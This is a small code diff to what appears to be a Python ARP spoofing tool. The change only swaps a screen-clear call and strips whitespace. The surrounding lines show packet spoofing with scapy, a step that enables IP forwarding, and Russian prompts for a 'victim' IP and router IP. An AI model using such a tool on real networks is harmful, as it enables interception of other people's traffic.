@@ -35,7 +35,8 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet)
 
 def ArpSpooferMain():
-    os.system('cls')
+    from main import uclear
+    uclear()
     print_arp_logo()
     try:
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
@@ -43,7 +44,7 @@ def ArpSpooferMain():
     except:
         print('[error] echo 1 > /proc/sys/net/ipv4/ip_forward')
         print("\n\n\n\n\n\n\n")
-        
+
     mamont_ip = input(Center.XCenter(colored('[+]Введите ip жертвы >> ', "red")))
     router_ip = input(Center.XCenter(colored('[+]Введите ip роутера >> ', "red")))
 
